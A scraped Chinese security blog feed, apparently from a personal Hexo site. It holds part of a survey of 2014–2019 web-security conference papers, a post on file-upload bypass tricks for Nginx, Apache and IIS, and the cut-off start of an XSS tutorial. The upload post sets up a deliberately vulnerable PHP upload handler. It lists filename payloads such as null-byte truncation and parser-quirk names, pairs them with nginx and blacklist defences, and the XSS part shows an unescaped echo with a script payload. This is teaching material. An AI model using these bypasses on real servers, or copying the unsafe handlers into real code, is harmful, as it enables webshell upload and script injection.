id="相关资料-1"><a href="#相关资料-1" class="headerlink" title="相关资料"></a>相关资料</h3><ul><li>https: //github.com/SocietyMaster/FlowCog. </li></ul><h2 id="Study-and-Mitigation-of-Origin-Stripping-Vulnerabilities-in-Hybrid-postMessage-Enabled-Mobile-Applications-S-amp-P18"><a href="#Study-and-Mitigation-of-Origin-Stripping-Vulnerabilities-in-Hybrid-postMessage-Enabled-Mobile-Applications-S-amp-P18" class="headerlink" title="Study and Mitigation of Origin Stripping Vulnerabilities in Hybrid-postMessage Enabled Mobile Applications, S&amp;P18"></a>Study and Mitigation of Origin Stripping Vulnerabilities in Hybrid-postMessage Enabled Mobile Applications, S&amp;P18</h2><p>web app通过post进行跨域请求，安卓的混合应用也会使用这些技术，它拓展了postMessage（我们称为“hybird postMessage”，同时也引入了新的问题——origin stripping vulnerability。本文中我们设计了一个工具来检测这问题。</p><h2 id="Mobile-Application-Web-API-Reconnaissance-Web-to-Mobile-Inconsistencies-amp-Vulnerabilities-S-amp-P18"><a href="#Mobile-Application-Web-API-Reconnaissance-Web-to-Mobile-Inconsistencies-amp-Vulnerabilities-S-amp-P18" class="headerlink" title="Mobile Application Web API Reconnaissance: Web-to-Mobile Inconsistencies &amp; Vulnerabilities, S&amp;P18**"></a>Mobile Application Web API Reconnaissance: Web-to-Mobile Inconsistencies &amp; Vulnerabilities, S&amp;P18**</h2><p>为了节约算力，很多webAPI的验证工作会在移动端进行，但是如果web端不重复验证的话，就会产生不一致的问题，攻击者可以篡改流量来攻击web应用。本文中，我们提出一个工具：WARDroid，它可以自动化的寻找web端和移动端的不一致问题。具体来说，WARDroid静态分析android app中的http通讯模板，接着通过黑盒测试的方法识别不一致性。</p><p><strong>Idea: </strong>可不可以做一个web的？因为web的前后端分离也会造成不一致问题(会议上有人提问)。</p><h3 id="Extract-Backward"><a href="#Extract-Backward" class="headerlink" title="Extract Backward"></a>Extract Backward</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1547692426847.png" alt="1547692426847"></p><h3 id="HTTP-Request-Templates"><a href="#HTTP-Request-Templates" class="headerlink" title="HTTP Request Templates"></a>HTTP Request Templates</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1547692490082.png" alt="1547692490082"></p><h2 id="Measuring-the-Insecurity-of-Mobile-Deep-Links-of-Android-usenix17"><a href="#Measuring-the-Insecurity-of-Mobile-Deep-Links-of-Android-usenix17" class="headerlink" title="Measuring the Insecurity of Mobile Deep Links of Android, usenix17"></a>Measuring the Insecurity of Mobile Deep Links of Android, usenix17</h2><p>Deep Link是指应用内特殊的URI，它有助于网络到应用的通信，Android推出了两种新方法”App links”和“Intent URLs”用来替换scheme URL，但是没有多少时间，本文调查了2014-2016年google市场的APP，发现新的连接方式并没有带来安全性改善，只有2.2%的应用正确使用了新方法，另外，我们发现了一种新的风险，最后，我们发现了更多的URL劫持的案例。</p><h2 id="AUTHSCOPE-Towards-Automatic-Discovery-of-Vulnerable-Authorizations-in-Online-Services-ccs17"><a href="#AUTHSCOPE-Towards-Automatic-Discovery-of-Vulnerable-Authorizations-in-Online-Services-ccs17" class="headerlink" title="AUTHSCOPE: Towards Automatic Discovery of Vulnerable Authorizations in Online Services, ccs17*"></a>AUTHSCOPE: Towards Automatic Discovery of Vulnerable Authorizations in Online Services, ccs17*</h2><p>本文设计AuthScope工具，该工具能够自动执行移动应用程序，并在相应的在线服务中识别出易受攻击的访问控制实现。</p><h2 id="Effective-Real-Time-Android-Application-Auditing-S-amp-P14"><a href="#Effective-Real-Time-Android-Application-Auditing-S-amp-P14" class="headerlink" title="Effective Real-Time Android Application Auditing, S&amp;P14"></a>Effective Real-Time Android Application Auditing, S&amp;P14</h2><p>本文设计了一套动态审计工具来检查应用是否存在<strong>数据泄露</strong>问题，降低静态检测的误报率。</p><h1 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h1><p>js存在的安全问题包含了XSS，因此这里排除了XSS。</p><h2 id="CodeAlchemist-Semantics-Aware-Code-Generation-to-Find-Vulnerabilities-in-JavaScript-Engines-ndss19"><a href="#CodeAlchemist-Semantics-Aware-Code-Generation-to-Find-Vulnerabilities-in-JavaScript-Engines-ndss19" class="headerlink" title="CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines, ndss19"></a>CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines, ndss19</h2><p>本文设计了一套js代码生成工具，它可以生成语义和语法上都正确的JavaScript片段，因此可以<strong>用于fuzz来发现JavaScript引擎的漏洞</strong>。具体来说，该工具将种子分解为代码片段，每一个片段用一段约束来标记，这些约束表示它与其他代码块在一起的条件。</p><h2 id="SYNODE-Understanding-and-Automatically-Preventing-Injection-Attacks-on-NODE-JS-ndss18"><a href="#SYNODE-Understanding-and-Automatically-Preventing-Injection-Attacks-on-NODE-JS-ndss18" class="headerlink" title="SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE.JS, ndss18"></a>SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE.JS, ndss18</h2><p>本文发现Nodejs的很多模块存在命令注入攻击的问题，因此本文提出了Synode，一种结合静态分析和动态的方法，使开发者安全的使用这些有问题的库。具体来说，Synode静态分析哪些值会传播到API中，并且在安装时修复；动态运行时，它截恶意请求防止他们传递到api中。</p><h3 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h3><ul><li>X. Jin, X. Hu, K. Ying, W. Du, H. Yin, and G. N. Peri. Code injection attacks on HTML5-based mobile apps: Characterization, detection and mitigation. In Conference on Computer and Communications Security, pages 66–77, 2014</li><li>P. Saxena, D. Molnar, and B. Livshits. SCRIPTGARD: automatic context-sensitive sanitization for large-scale legacy web applications. In CCS, pages 601–614, 2011. </li><li>M. Ter Louw and V. N. Venkatakrishnan. Blueprint: Robust prevention of cross-site scripting attacks for existing browsers. In Sec. and Privacy, pages 331–346, 2009. </li><li>S. Guarnieri and B. Livshits. GATEKEEPER: mostly static enforcement of security and reliability policies for JavaScript code. In USENIX Security, pages 151–168, 2009. </li></ul><h2 id="Thou-Shalt-Not-Depend-on-Me-Analysing-the-Use-of-Outdated-JavaScript-Libraries-on-the-Web-survey-ndss17"><a href="#Thou-Shalt-Not-Depend-on-Me-Analysing-the-Use-of-Outdated-JavaScript-Libraries-on-the-Web-survey-ndss17" class="headerlink" title="Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web (survey), ndss17"></a>Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web (survey), ndss17</h2><p>本文对Alexa有排行的网站镜像进行了调查，发现web开发者会应用很多第三方库（比如jQuery），这些库的旧版本存在漏洞。</p><h2 id="The-Unexpected-Dangers-of-Dynamic-JavaScript-survey-usenix15"><a href="#The-Unexpected-Dangers-of-Dynamic-JavaScript-survey-usenix15" class="headerlink" title="The Unexpected Dangers of Dynamic JavaScript (survey), usenix15"></a>The Unexpected Dangers of Dynamic JavaScript (survey), usenix15</h2><p>JS存在XSS等安全性问题，为此本文进行了实证研究了它的影响，并且提出了安全防护方法。</p><h2 id="ZigZag-Automatically-Hardening-Web-Applications-Against-Client-side-Validation-Vulnerabilities-usenix15"><a href="#ZigZag-Automatically-Hardening-Web-Applications-Against-Client-side-Validation-Vulnerabilities-usenix15" class="headerlink" title="ZigZag: Automatically Hardening Web Applications Against Client-side Validation Vulnerabilities, usenix15"></a>ZigZag: Automatically Hardening Web Applications Against Client-side Validation Vulnerabilities, usenix15</h2><p>现代网站大量依赖JS，这些JS的客户端验证（client-side validation,CSV）存在脆弱性（实际上是逻辑问题），本文提出了一个检测该类问题的系统ZigZag，它是一个代理，透明的检测用户端代码，并且实时的获取执行状态，从中产生控制流和数据，以此识别与攻击相关的操作。</p><h2 id="Hunting-the-Red-Fox-Online-Understanding-and-Detection-of-Mass-Redirect-Script-Injections-S-amp-P14"><a href="#Hunting-the-Red-Fox-Online-Understanding-and-Detection-of-Mass-Redirect-Script-Injections-S-amp-P14" class="headerlink" title="Hunting the Red Fox Online: Understanding and Detection of Mass Redirect-Script Injections, S&amp;P14"></a>Hunting the Red Fox Online: Understanding and Detection of Mass Redirect-Script Injections, S&amp;P14</h2><p>本文开发了工具JsRED，一种用于自动检测<strong>重定向脚本注入</strong>的新技术，它通过比较当前的JS-lib版本和正常的版本差异判断脚本是否被替换。</p><h1 id="Access-control"><a href="#Access-control" class="headerlink" title="Access control"></a>Access control</h1><h2 id="FlowWatcher-Defending-against-Data-Disclosure-Vulnerabilities-in-Web-Applications-css15"><a href="#FlowWatcher-Defending-against-Data-Disclosure-Vulnerabilities-in-Web-Applications-css15" class="headerlink" title="FlowWatcher: Defending against Data Disclosure Vulnerabilities in Web Applications, css15"></a>FlowWatcher: Defending against Data Disclosure Vulnerabilities in Web Applications, css15</h2><p>web应用会出现水平越权的问题，由于很多网站的用户访问控制模型类似，因此我们可以布置一个外部代理（nginx端），然后观察用户的所有流量，然后根据预期的访问控制策略规范来侦测未经授权的访问。</p><h2 id="MACE-Detecting-Privilege-Escalation-Vulnerabilities-in-Web-Applications-css14"><a href="#MACE-Detecting-Privilege-Escalation-Vulnerabilities-in-Web-Applications-css14" class="headerlink" title="MACE: Detecting Privilege Escalation Vulnerabilities in Web Applications, css14"></a>MACE: Detecting Privilege Escalation Vulnerabilities in Web Applications, css14</h2><p>我们实现了工具MACE，通过访问资源时的上下文不一致性来识别水平特权升级漏洞</p><h2 id="Automating-Isolation-and-Least-Privilege-in-Web-Services-S-amp-P14"><a href="#Automating-Isolation-and-Least-Privilege-in-Web-Services-S-amp-P14" class="headerlink" title="Automating Isolation and Least Privilege in Web Services, S&amp;P14"></a>Automating Isolation and Least Privilege in Web Services, S&amp;P14</h2><p>本文设计了一个防止数据未授权读写的系统Passe，它动态地从开发者提供的测试用例分析数据流和控制流，将应用分离成几个模块，并且将模块放入沙盒中运行。另外，我们将Passe嵌入了Django框架中，我们发现它可以正确地分析96%的策略，同时还可以防御XSS攻击。</p><h1 id="Survey"><a href="#Survey" class="headerlink" title="Survey"></a>Survey</h1><p>能分类的survey已经分到具体的类型中，这里列出与web相关的其他调查。</p><h2 id="Same-Origin-Policy-Evaluation-in-Modern-Browsers-usenix17"><a href="#Same-Origin-Policy-Evaluation-in-Modern-Browsers-usenix17" class="headerlink" title="Same-Origin Policy: Evaluation in Modern Browsers, usenix17"></a>Same-Origin Policy: Evaluation in Modern Browsers, usenix17</h2><p>SOP-DOM是同源策略的自己，它控制主文档和嵌入文档之间的交互，但是没有正式的规范，本文通过实证研究，发现除了Web Origins之外，SOP-DOM授予的访问权限至少取决于三个属性：嵌入元素（EE）的类型，沙箱（浏览器）和CORS属性。</p><h2 id="How-the-Web-Tangled-Itself-Uncovering-the-History-of-Client-Side-Web-In-Security-usenix17"><a href="#How-the-Web-Tangled-Itself-Uncovering-the-History-of-Client-Side-Web-In-Security-usenix17" class="headerlink" title="How the Web Tangled Itself: Uncovering the History of Client-Side Web (In)Security, usenix17"></a>How the Web Tangled Itself: Uncovering the History of Client-Side Web (In)Security, usenix17</h2><p>本文检查了97-16年的重要网站代码和头信息，以此确定web技术的关键趋势，随后评估与之关联的漏洞，在调查解决他们的安全防御机制。本文发现自2000年以来，JavaScript开始流行，客户端注入的可能性增加，但CSP的部署却没有跟上，另外使用HTTP only cookie的网站更容易遭受XSS。</p><h1 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h1><h2 id="k-fingerprinting-A-Robust-Scalable-Website-Fingerprinting-Technique-fingerprint-usenix16"><a href="#k-fingerprinting-A-Robust-Scalable-Website-Fingerprinting-Technique-fingerprint-usenix16" class="headerlink" title="k-fingerprinting: A Robust Scalable Website Fingerprinting Technique(fingerprint), usenix16"></a>k-fingerprinting: A Robust Scalable Website Fingerprinting Technique(fingerprint), usenix16</h2><p>攻击者可以在tor网络中实施被动攻击比如，指纹识别，本文提出了基于随机森林的网站指纹识别技术，它能抵抗tor和先进的网站指纹识别防御技术。</p><h2 id="Cloak-of-Visibility-Detecting-When-Machines-Browse-a-Different-Web-fingerprint-S-amp-P16"><a href="#Cloak-of-Visibility-Detecting-When-Machines-Browse-a-Different-Web-fingerprint-S-amp-P16" class="headerlink" title="Cloak of Visibility: Detecting When Machines Browse a Different Web(fingerprint), S&amp;P16"></a>Cloak of Visibility: Detecting When Machines Browse a Different Web(fingerprint), S&amp;P16</h2><p>恶意网站会使用复杂技术隐藏自身，防止被搜索引擎发现其本质。我们调查了暗网的十大著名技术，并且开发了一种反隐身系统。</p><h2 id="JavaScript-Template-Attacks-Automatically-Inferring-Host-Information-for-Targeted-Exploits-fingerprint-ndss19"><a href="#JavaScript-Template-Attacks-Automatically-Inferring-Host-Information-for-Targeted-Exploits-fingerprint-ndss19" class="headerlink" title="JavaScript Template Attacks: Automatically Inferring Host Information for Targeted Exploits(fingerprint), ndss19"></a>JavaScript Template Attacks: Automatically Inferring Host Information for Targeted Exploits(fingerprint), ndss19</h2><p>如今的浏览器会提供匿名功能隐藏信息，而本文提出了一种自动化推断系统信息（包括软件和硬件）的方法，该方法通过JavaScript引擎收集各种数据，再根据这些属性创建模板，如果这个模板的某一属性在各个系统上都不相同则它是一个依赖于环境的属性。</p><h1 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h1><h2 id="On-Omitting-Commits-and-Committing-Omissions-Preventing-Git-Metadata-Tampering-That-Re-introduces-Software-Vulnerabilities-git-usenix16"><a href="#On-Omitting-Commits-and-Committing-Omissions-Preventing-Git-Metadata-Tampering-That-Re-introduces-Software-Vulnerabilities-git-usenix16" class="headerlink" title="On Omitting Commits and Committing Omissions: Preventing Git Metadata Tampering That (Re)introduces Software Vulnerabilities (git), usenix16"></a>On Omitting Commits and Committing Omissions: Preventing Git Metadata Tampering That (Re)introduces Software Vulnerabilities (git), usenix16</h2><p>元数据攻击指针对版本控制系统的攻击方法，它欺骗开发者执行意外操作，比如将未经测试的代码合并到生产分支中，或是包含一致漏洞的组件。本文提出了一种防御方案，通过维护开发人员的加密签名后的日志环节这些攻击。</p><h2 id="Automatically-Detecting-Vulnerable-Websites-Before-They-Turn-Malicious-mechine-learning-usenix14"><a href="#Automatically-Detecting-Vulnerable-Websites-Before-They-Turn-Malicious-mechine-learning-usenix14" class="headerlink" title="Automatically Detecting Vulnerable Websites Before They Turn Malicious (mechine learning), usenix14"></a>Automatically Detecting Vulnerable Websites Before They Turn Malicious (mechine learning), usenix14</h2><p>本文使用数据挖掘和机器学习的几种技术，来预测一个给定的、未被侵入的网站是否会变得有问题。</p><h2 id="Static-detection-of-asymptotic-resource-side-channel-vulnerabilities-in-web-applications-side-channel-ase17"><a href="#Static-detection-of-asymptotic-resource-side-channel-vulnerabilities-in-web-applications-side-channel-ase17" class="headerlink" title="Static detection of asymptotic resource side-channel vulnerabilities in web applications (side channel), ase17"></a>Static detection of asymptotic resource side-channel vulnerabilities in web applications (side channel), ase17</h2><p>本文开发了一个SCANNER的工具，用于检测PHP应用程序中与资源相关的侧信道泄露漏洞——例如一个关于健康的网站，泄露了病人吃药的时间。</p><h2 id="Predicting-Impending-Exposure-to-Malicious-Content-from-User-Behavior-defense-ccs18"><a href="#Predicting-Impending-Exposure-to-Malicious-Content-from-User-Behavior-defense-ccs18" class="headerlink" title="Predicting Impending Exposure to Malicious Content from User Behavior(defense), ccs18"></a>Predicting Impending Exposure to Malicious Content from User Behavior(defense), ccs18</h2><p>本文提出了一种系统，可以再单个浏览会话级别上观察用户行为，从而预测他们是否是攻击型为，已达到提前预防的目的。</p><h2 id="Deemon-Detecting-CSRF-with-Dynamic-Analysis-and-Property-Graphs-CSRF-ccs17"><a href="#Deemon-Detecting-CSRF-with-Dynamic-Analysis-and-Property-Graphs-CSRF-ccs17" class="headerlink" title="Deemon: Detecting CSRF with Dynamic Analysis and Property Graphs (CSRF), ccs17"></a>Deemon: Detecting CSRF with Dynamic Analysis and Property Graphs (CSRF), ccs17</h2><p>本文提出检测CSRF的框架，该框架考虑了web应用的执行流程，数据流以及整体架构，构建一个属性图，然后使用图遍历，发觉潜在的CSRF问题。Deemon自动判断web应用的执行环境，接着无监督的产生动态记录，比如网络交互，服务端执行和数据库操作，使用这些记录Deemon构建一个图模型，他表示捕获的状态转换和数据流；接着遍历这个图来发觉http状态变换，这些变换与CSRF流动现骨干。</p><h2 id="Attack-Patterns-for-Black-Box-Security-Testing-of-Multi-Party-Web-Applications-SSO-ndss16"><a href="#Attack-Patterns-for-Black-Box-Security-Testing-of-Multi-Party-Web-Applications-SSO-ndss16" class="headerlink" title="Attack Patterns for Black-Box Security Testing of Multi-Party Web Applications(SSO), ndss16*"></a>Attack Patterns for Black-Box Security Testing of Multi-Party Web Applications(SSO), ndss16*</h2><p>我们针对单点登陆(SSO)存在的问题，设计了两种攻击模式CSRF和XSS，并且基于ZAP设计了扫描器，经过实验我们发先它能发现知名网站的安全性问题。</p><h2 id="Toward-Black-Box-Detection-of-Logic-Flaws-in-Web-Applications-Logic-Flaws-ndss14"><a href="#Toward-Black-Box-Detection-of-Logic-Flaws-in-Web-Applications-Logic-Flaws-ndss14" class="headerlink" title="Toward Black-Box Detection of Logic Flaws in Web Applications (Logic Flaws), ndss14"></a>Toward Black-Box Detection of Logic Flaws in Web Applications (Logic Flaws), ndss14</h2><p>由于缺失文档，判断逻辑漏洞十分困难，现有的工具需要调查源代码或是只适用于小规模应用，而我们利用用户产生的流量产生一个行为序列，接着重用这个序列判断网站是否存在问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;About&quot;&gt;&lt;a href=&quot;#About&quot; class=&quot;headerlink&quot; title=&quot;About&quot;&gt;&lt;/a&gt;About&lt;/h1&gt;&lt;p&gt;本文列出四大安全会议（USENIX、CCS、NDSS和S&amp;amp;P）近5年来与Web安全有关的研究，已发现web方
      
    
    </summary>
    
      <category term="Web安全-学术" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-%E5%AD%A6%E6%9C%AF/"/>
    
    
      <category term="Web安全" scheme="http://anemone.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="学术" scheme="http://anemone.top/tags/%E5%AD%A6%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>容器上传绕过总结</title>
    <link href="http://anemone.top/%E7%BB%84%E4%BB%B6-%E5%AE%B9%E5%99%A8%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>http://anemone.top/组件-容器上传绕过总结/</id>
    <published>2019-02-15T07:15:43.000Z</published>
    <updated>2019-09-22T10:14:18.795Z</updated>
    
    <content type="html"><![CDATA[<h1 id="搭建漏洞服务"><a href="#搭建漏洞服务" class="headerlink" title="搭建漏洞服务"></a>搭建漏洞服务</h1><p>还是先搭一个漏洞的服务吧：新建一个~/Desktop/php/upload文件夹，文件夹下存在如下结构的文件和文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── files</span><br><span class="line">└── upload.php</span><br><span class="line"></span><br><span class="line">1 directory, 1 file</span><br></pre></td></tr></table></figure><p>upload.php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;</span><br><span class="line">enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123;</span><br><span class="line">    echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    // 判断当期目录下的 upload 目录是否存在该文件</span><br><span class="line">    // 如果没有 upload 目录，你需要创建它，upload 目录权限为 777</span><br><span class="line">    if (file_exists(&quot;files/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在。 &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;PWD: &quot; . `pwd` . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">        // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span><br><span class="line">        $file_path = &quot;files/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $success = move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $file_path);</span><br><span class="line">        echo &quot;Stored in: &quot; .$file_path.&quot;&lt;br/&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        if(file_exists($file_path))&#123;</span><br><span class="line">            $str = file_get_contents($file_path);//将整个文件内容读入到一个字符串中</span><br><span class="line">            $str = str_replace(&quot;\r\n&quot;,&quot;&lt;br /&gt;&quot;,$str);</span><br><span class="line">            $str = htmlspecialchars($str);</span><br><span class="line">            echo &quot;File Contents: $str&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p><code>1.php%001.jpg</code>，Nginx在<code>%00</code>截断，例如：</p><p>用%00截断过狗：</p><p><img src="/组件-容器上传绕过总结/1544361917866.png" alt="1544361917866"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>设置上传目录不被php解析：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> test.com;</span><br><span class="line">    <span class="attribute">root</span> /home/repersp/Desktop/php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">index</span> test.php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \/upload\/files\/.*</span> &#123;</span><br><span class="line">        <span class="attribute">root</span> /home/repersp/Desktop/php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># With php7.0-cgi alone:</span></span><br><span class="line">        <span class="comment"># fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line">        <span class="comment"># With php7.0-fpm:</span></span><br><span class="line">        <span class="attribute">fastcgi_pass</span> unix:/run/php/php7.0-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件名后缀黑名单：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="2-4-0以前"><a href="#2-4-0以前" class="headerlink" title="2.4.0以前"></a>2.4.0以前</h2><p><code>1.php.xxx</code>Apache从后往前解析，直到能解析。</p><h2 id="2-4-0-2-4-29"><a href="#2-4-0-2-4-29" class="headerlink" title="2.4.0-2.4.29"></a>2.4.0-2.4.29</h2><p><code>1.php%0A</code>因为代码中不能用<code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code>获取文件名，所以利用条件苛刻。</p><h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="6-0"><a href="#6-0" class="headerlink" title="6.0"></a>6.0</h2><ul><li><code>/xx.asp;.jpg</code> IIS不解析<code>;</code>后面的内容</li><li><code>/1.asp/1.jpg</code> IIS将<code>.asp</code>文件夹下的所有文件解析</li></ul><h2 id="7-5"><a href="#7-5" class="headerlink" title="7.5"></a>7.5</h2><p><code>php.jpg/.php</code> 要开启<code>cgi.fix_pathinfo=1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;搭建漏洞服务&quot;&gt;&lt;a href=&quot;#搭建漏洞服务&quot; class=&quot;headerlink&quot; title=&quot;搭建漏洞服务&quot;&gt;&lt;/a&gt;搭建漏洞服务&lt;/h1&gt;&lt;p&gt;还是先搭一个漏洞的服务吧：新建一个~/Desktop/php/upload文件夹，文件夹下存在如下结构的文件
      
    
    </summary>
    
      <category term="Web安全-组件" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-%E7%BB%84%E4%BB%B6/"/>
    
    
      <category term="nginx" scheme="http://anemone.top/tags/nginx/"/>
    
      <category term="apache" scheme="http://anemone.top/tags/apache/"/>
    
      <category term="IIS" scheme="http://anemone.top/tags/IIS/"/>
    
  </entry>
  
  <entry>
    <title>XSS类型、利用和防御</title>
    <link href="http://anemone.top/xss-XSS%E7%B1%BB%E5%9E%8B%E3%80%81%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
    <id>http://anemone.top/xss-XSS类型、利用和防御/</id>
    <published>2019-02-14T06:39:05.000Z</published>
    <updated>2019-09-29T08:52:16.816Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>用户访问带有XSS代码的请求，服务器立即将代码发送至浏览器，浏览器执行恶意代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1/reflect.php?xss=&lt;script&gt;alert(1);&lt;/script&gt;</span></span><br><span class="line">setcookie(<span class="string">'session'</span>, <span class="string">'qwerty'</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>];</span><br></pre></td></tr></table></figure><p><img src="/xss-XSS类型、利用和防御/1550126906314.png" alt="1550126906314"></p><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>XSS代码被保存（至数据库），待页面被访问时再执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 